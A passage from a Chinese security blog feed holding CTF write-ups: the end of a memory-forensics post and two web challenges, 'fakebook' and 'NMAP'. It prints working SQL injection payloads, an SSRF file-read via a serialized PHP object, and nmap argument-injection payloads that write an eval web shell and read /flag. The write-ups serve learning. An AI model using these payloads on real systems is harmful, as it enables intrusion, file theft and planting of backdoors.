number">600</span><span class="token punctuation">,</span><span class="token number">600</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'black'</span><span class="token punctuation">)</span>pix<span class="token operator">=</span>pic<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> points<span class="token punctuation">:</span>i<span class="token operator">=</span>i<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span>pix<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">)</span>pic<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'out.png'</span><span class="token punctuation">,</span><span class="token string">'png'</span><span class="token punctuation">)</span></code></pre><p>得到二维码<br><img src="https://img-blog.csdnimg.cn/20201107170135628.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>识别后得到</p><pre class="language-bash" data-language="bash"><code class="language-bash">Here is the vigenere key: aeolus, but i deleted the encrypted message。</code></pre><p>维吉尼亚密码，密钥是<code>aeolus</code><br>密文不知道，前面的可疑字符串有可能是密文<br><img src="https://img-blog.csdnimg.cn/20201107170425871.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>得到结果。这个题就有点杂了。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>学到这里，内存取证的基础题已经可以应付了，这是第二次学习取证的知识，感觉很有意思。</p><h3 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h3><p><a href="https://blog.xiafeng2333.top/ctf-25/">https://blog.xiafeng2333.top/ctf-25/</a><br><a href="https://blog.xiafeng2333.top/ctf-11/">https://blog.xiafeng2333.top/ctf-11/</a><br><a href="https://segmentfault.com/a/1190000018813033?utm_source=tag-newest">https://segmentfault.com/a/1190000018813033?utm_source=tag-newest</a></p>]]></content>
      
      
      <categories>
          
          <category> kali </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 电子取证 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>详谈两道Web题</title>
      <link href="/posts/ae045cae/"/>
      <url>/posts/ae045cae/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近学校也在招新，基本没什么时间做题，最近也很少发博客。就写几道题来充充数吧。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="fakebook"><a href="#fakebook" class="headerlink" title="fakebook"></a>fakebook</h3><p><img src="https://img-blog.csdnimg.cn/20201027195244609.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>我的思路呢，只有一点沾边了，记一下现在的思考：<br>注册了一个username就找不到其他信息了，然后考虑了源码泄露。找了<code>robots.txt</code>，发现了一个<code>user.php.bak</code>，访问得到泄露的文件。是这样</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">UserInfo</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$blog</span> <span class="token operator">=</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$age</span><span class="token punctuation">,</span> <span class="token variable">$blog</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span> <span class="token operator">=</span> <span class="token punctuation">(</span>int<span class="token punctuation">)</span><span class="token variable">$age</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">blog</span> <span class="token operator">=</span> <span class="token variable">$blog</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$httpCode</span> <span class="token operator">=</span> <span class="token function">curl_getinfo</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLINFO_HTTP_CODE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$httpCode</span> <span class="token operator">==</span> <span class="token number">404</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token number">404</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$output</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> getBlogContents <span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">blog</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> isValidBlog <span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$blog</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">blog</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i"</span><span class="token punctuation">,</span> <span class="token variable">$blog</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>然后大概看了一眼，没get到信息(太菜了，做题少)，就先放一边了，继续查看有没有其他信息泄露的，所以就扫了一下。然鹅没发现其他信息了，还提示请求过多，然后就重启了靶机。接着<br>看到了<br><img src="https://img-blog.csdnimg.cn/20201027204340873.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>猜想这些信息写到了这里，注册信息会显示在这里，应该是有SQL注入的。所以就丢sqlmap里进行探测了，刚探测出来一个数据库名的第一个字母靶机又崩了。emmm，所以没有继续尝试。看那个文件，重点在<code>get(url)</code>的函数中，百度查了一下，发现了有趣的知识，curl导致SSRF漏洞。然后复现一下这个漏洞。<br>漏洞代码如下：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">curl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$re</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$re</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">curl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20201028143658287.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>而且在实验时我给的权限比较高，所以可以直接使用file命令来读取文件。</p><pre class="language-bash" data-language="bash"><code class="language-bash">?url<span class="token operator">=</span>file:///C://m0re.txt</code></pre><p><img src="https://img-blog.csdnimg.cn/20201028144051935.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>当然知道网站根目录后还可以进行读取配置文件。可以直接读取根目录下的<code>config.php</code>我这里是windows系统搭建的环境，所以就读取一下根目录的首页。<br><img src="https://img-blog.csdnimg.cn/20201028144732253.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>简单利用到此为止。<br>不过这道题还是不知道怎么利用。所以wp复现大师傅们的思路。<br>看了wp发现还可以用御剑扫描一下敏感信息，发现了<code>flag.php</code>这个文件。<br>然后就是SQL注入手注。发送过多数据包会被禁止访问的。<br><img src="https://img-blog.csdnimg.cn/20201028150956624.png#pic_center" alt="m0re" loading="lazy"><br>改成<code>and 1=2#</code>报错<br><img src="https://img-blog.csdnimg.cn/2020102815171896.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>这里使用报错注入进行测试<br><img src="https://img-blog.csdnimg.cn/20201028152006131.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>有四列<br>直接查看它的表，这里使用<code>make_set</code>函数</p><pre class="language-sql" data-language="sql"><code class="language-sql">?<span class="token keyword">no</span><span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>make_set<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">'~'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#</span></code></pre><p><img src="https://img-blog.csdnimg.cn/2020102819185375.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>然后老套路</p><pre class="language-sql" data-language="sql"><code class="language-sql">爆列名?<span class="token keyword">no</span><span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>make_set<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">'~'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">"users"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#</span>爆字段?<span class="token keyword">no</span><span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>make_set<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">'~'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">data</span> <span class="token keyword">from</span> users<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20201028192019252.png#pic_center" alt="m0re" loading="lazy"><br>注入出来的数据是经过序列化的。<br>最后的时候，发现在<code>view.php</code>中是可以看到博客链接中的内容的。<br><img src="https://img-blog.csdnimg.cn/20201028195520709.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>查看源码，<img src="https://img-blog.csdnimg.cn/20201028193312124.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>base64解出来是百度的首页源码。所以这里应该是显示链接界面的源码的。<br>那么之前查看到<code>flag.php</code>在网站根目录中，所以现在要做的就是读取<code>flag.php</code>的源码。目的很明确了，接下来就是进行解题，利用存在的SSRF漏洞使用file读取<code>flag.php</code>的源码。<br><code>flag.php</code>的路径为<code>/var/www/html/flag.php</code>所以需要进行构造下面的SQL</p><pre class="language-sql" data-language="sql"><code class="language-sql">?<span class="token keyword">no</span><span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token comment">/**/</span><span class="token keyword">union</span><span class="token comment">/**/</span><span class="token keyword">select</span><span class="token comment">/**/</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">'O:8:"UserInfo":3:&#123;s:4:"name";s:4:"test";s:3:"age";i:123;s:4:"blog";s:29:"file:///var/www/html/flag.php";&#125;'</span><span class="token comment">#</span></code></pre><p>之前源码泄漏得到的<code>user.php</code>的源码，进行序列化<br><img src="https://img-blog.csdnimg.cn/20201028200120819.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>代码：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">UserInfo</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"test"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token number">111</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$blog</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"file:///var/www/html/flag.php"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$m0re_1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UserInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$m0re_2</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$m0re_1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$m0re_2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>#序列化结果#O:8:"UserInfo":3:&#123;s:4:"name";s:4:"test";s:3:"age";i:111;s:4:"blog";s:29:"file:///var/www/html/flag.php";&#125;</code></pre><p>因为对SQL注入的union和select等有过滤，所以用<code>/**/</code>来进行绕过<br><img src="https://img-blog.csdnimg.cn/20201028200404752.png#pic_center" alt="m0re" loading="lazy"><br>然而这样就可以绕过<br><img src="https://img-blog.csdnimg.cn/20201028200508536.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>成功。<br><img src="https://img-blog.csdnimg.cn/20201028200532648.png#pic_center" alt="m0re" loading="lazy"><br>解出base64编码得到<code>flag.php</code>的源码<br>得到flag。</p><h3 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h3><p>查看源码看到注释<br><img src="https://img-blog.csdnimg.cn/2020110211493041.png#pic_center" alt="m0re" loading="lazy"><br>看到这个框，首先想到了命令注入，原本思路跑偏了，直接在后面拼接命令行了，(憨憨行为hh)我把nmap直接忽略了。<br>正确思路是，使用nmap的参数命令来进行写入文件。</p><pre class="language-bash" data-language="bash"><code class="language-bash">-oN 尝试将扫描内容写入文件保存输出</code></pre><p><code>&#39; -oN m0re.txt &#39;</code>（注意引号也输入）<br>然后会在根目录写下<code>m0re.txt</code>，直接访问。</p><p><img src="https://img-blog.csdnimg.cn/20201102124820494.png#pic_center" alt="m0re" loading="lazy"><br>看到这里就有思路了吧，直接写一句话。<br>但是有过滤机制<code>&#39; -oN m0re.php &lt;?php phpinfo()?&gt; &#39;</code><br><img src="https://img-blog.csdnimg.cn/20201102125120908.png#pic_center" alt="m0re" loading="lazy"><br>进一步测试发现过滤的是<code>php</code>这个字符串<br>可以使用<code>.phtml</code>文件，在文件上传中有很多绕过<code>.php</code>的方法。<br><code>&#39; -oN m0re.phtml &lt;?=eval($_POST[a]);?&gt; &#39;</code><br>没有hacker…就是写入成功了。<br>蚁剑连接<br><img src="https://img-blog.csdnimg.cn/20201102125708900.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>得到flag。<br>可以通过蚁剑下载文件到本地测试。<br>也可以看看源码<br><code>index.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token keyword">require</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'settings.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">defined</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'WEB_SCANS'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Web scans disabled'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$host</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'php'</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token boolean constant">false</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Hacker..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$host</span> <span class="token operator">=</span> <span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$host</span> <span class="token operator">=</span> <span class="token function">escapeshellcmd</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$command</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"nmap "</span><span class="token punctuation">.</span> <span class="token constant">NMAP_ARGS</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">" -oX "</span> <span class="token punctuation">.</span> <span class="token constant">RESULTS_PATH</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">" "</span> <span class="token punctuation">.</span> <span class="token variable">$host</span><span class="token punctuation">;</span><span class="token variable">$result_scan</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$command</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$result_scan</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Something went wrong'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Location: result.php?f='</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token delimiter important">?></span></span></code></pre><p><code>    $host = escapeshellarg($host);</code><br><code>    $host = escapeshellcmd($host);</code><br>找到这个<a href="https://paper.seebug.org/164/">PHP escapeshellarg()+escapeshellcmd() 之殇</a><br>先查一下这两个函数是什么功能。<br>看到P神也写过一篇这样的文章<br><a href="https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html">谈escapeshellarg绕过与参数注入漏洞</a><br><img src="https://img-blog.csdnimg.cn/20201102131633276.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br><img src="https://img-blog.csdnimg.cn/20201102131705660.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br><a href="https://zhuanlan.zhihu.com/p/145906109">https://zhuanlan.zhihu.com/p/145906109</a><br>这个师傅写的很清楚，很好理解。所以我也本地实现一下。<br><img src="https://img-blog.csdnimg.cn/20201102220812643.png#pic_center" alt="m0re" loading="lazy"><br>在根目录下创建一个flag文件<br>注意是在根目录，而不是在系统根目录。这样的<br><img src="https://img-blog.csdnimg.cn/20201102222206805.png#pic_center" alt="m0re" loading="lazy"><br>然后执行文件。</p><p><img src="https://img-blog.csdnimg.cn/2020110222285465.png#pic_center" alt="m0re" loading="lazy"><br>没发现flag内容<br>然而将<code>$a</code>改成<code>127.0.0.1&#39; -iL /flag -oN m0re.txt</code><br>再次执行<br><img src="https://img-blog.csdnimg.cn/20201102222353277.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>会发现flag已经被读取了，而且写出一个文件是<code>m0re.txt</code><br>可以达到读取文件的效果。<br>经过两个函数进行转义，<code>$a</code>已经成了<code>&#39;127.0.0.1&#39;\\&#39;&#39; -iL /flag -oN juju.txt \&#39;</code><br>原因看过程</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">127.0</span>.0.1<span class="token string">' -iL /flag -oN m0re.txt'</span><span class="token number">127.0</span>.0.1<span class="token string">'\''</span> -iL /flag -oN m0re.txt<span class="token string">''</span><span class="token number">127.0</span>.0.1<span class="token string">'<span class="token entity" title="\\">\\</span>'</span>' -iL /flag -oN m0re.txt<span class="token punctuation">\</span>'</code></pre><p>看大佬的解析。<br><img src="https://img-blog.csdnimg.cn/20201102224629833.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>这个认真看很容易看懂的。<br>首先转义单引号。成了<code>127.0.0.1\&#39; -iL /flag -oN m0re.txt</code><br>然后给两遍加了单引号起连接作用，成了<code>&#39;127.0.0.1&#39;\&#39;&#39; -iL /flag -oN m0re.txt&#39;</code><br>以上是arg这个函数在起作用，然后呢就是cmd这个函数，<code>\</code>进行转义变成<br><code>\\</code>然后将最后那个没配对的单引号也给转义了，就成了最后一个payload了。</p><p>这是我自己的理解。</p>]]></content>
      
      
      <categories>
          
          <category> 网安学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF题记 </tag>
